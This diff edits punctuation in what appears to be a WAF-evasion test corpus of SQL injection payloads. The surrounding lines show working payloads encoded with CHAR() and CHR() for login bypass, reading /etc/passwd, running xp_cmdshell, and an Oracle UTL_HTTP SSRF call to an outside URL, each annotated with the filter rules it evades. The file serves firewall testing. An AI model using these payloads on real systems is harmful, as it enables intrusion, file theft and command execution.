@@ -2,7 +2,7 @@ schema = 1
 # SQL injection payloads pre-encoded with the `sql_char_decompose` (MySQL/
 # MSSQL `CHAR(N,N,...)`) and `pg_chr_decompose` (Postgres/Oracle
 # `(CHR(N)||CHR(N)||...)`) tampers. Distinct from `concat_split_2026`
-# because the output contains NO single-quoted ASCII tokens — defeats
+# because the output contains NO single-quoted ASCII tokens, defeats
 # both literal-substring rules AND CONCAT-shaped rules.
 #
 # Manual form:
@@ -15,13 +15,13 @@ schema = 1
 id = "char_decompose_admin_login"
 class = "sql"
 payload = "1 OR username=CHAR(97,100,109,105,110)--"
-description = "OR username='admin' — codepoint args, no quoted tokens; CRS literal-string rules and CONCAT regex both miss."
+description = "OR username='admin' (codepoint args, no quoted tokens; CRS literal-string rules and CONCAT regex both miss)."
 
 [[case]]
 id = "char_decompose_load_file_etc_passwd"
 class = "sql"
 payload = "1' UNION SELECT LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100)),NULL--"
-description = "LOAD_FILE('/etc/passwd') — full path as CHAR() codepoints; LFI path-traversal regex blind."
+description = "LOAD_FILE('/etc/passwd') (full path as CHAR() codepoints; LFI path-traversal regex blind)."
 
 [[case]]
 id = "char_decompose_into_outfile_php_shell"
@@ -33,7 +33,7 @@ description = "INTO OUTFILE webshell drop with both PHP payload AND destination 
 id = "char_decompose_mssql_xp_cmdshell"
 class = "sql"
 payload = "1; EXEC xp_cmdshell(CHAR(110,101,116,32,117,115,101,114))--"
-description = "MSSQL xp_cmdshell('net user') — common privilege-discovery via CHAR()-encoded command."
+description = "MSSQL xp_cmdshell('net user') (common privilege-discovery via CHAR()-encoded command)."
 
 [[case]]
 id = "char_decompose_extractvalue_db_leak"
@@ -47,19 +47,19 @@ description = "Error-based DB-name leak; the leading-tilde delimiter (~ = 126) i
 id = "chr_decompose_admin_login_pg"
 class = "sql"
 payload = "1 OR username=(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))--"
-description = "Postgres OR username='admin' — pipe-concat is SQL-standard but some WAFs block || aggressively; CHR() lets through where CHAR() wouldn't."
+description = "Postgres OR username='admin' (pipe-concat is SQL-standard but some WAFs block || aggressively; CHR() lets through where CHAR() wouldn't)."
 
 [[case]]
 id = "chr_decompose_pg_read_file"
 class = "sql"
 payload = "1' UNION SELECT pg_read_file((CHR(47)||CHR(101)||CHR(116)||CHR(99)||CHR(47)||CHR(112)||CHR(97)||CHR(115)||CHR(115)||CHR(119)||CHR(100)),0,1000),NULL--"
-description = "Postgres pg_read_file('/etc/passwd') — superuser-only function; path as CHR() pipe-concat."
+description = "Postgres pg_read_file('/etc/passwd') (superuser-only function; path as CHR() pipe-concat)."
 
 [[case]]
 id = "chr_decompose_oracle_utl_http"
 class = "sql"
 payload = "1 AND UTL_HTTP.REQUEST((CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(97)||CHR(116)||CHR(116)||CHR(46)||CHR(99)||CHR(111)||CHR(109)))=1--"
-description = "Oracle UTL_HTTP SSRF — http://att.com URL as CHR() pipe-concat. Path-traversal + SSRF regex blind."
+description = "Oracle UTL_HTTP SSRF (http://att.com URL as CHR() pipe-concat. Path-traversal + SSRF regex blind)."
 
 [[case]]
 id = "chr_decompose_pg_sleep_blind"
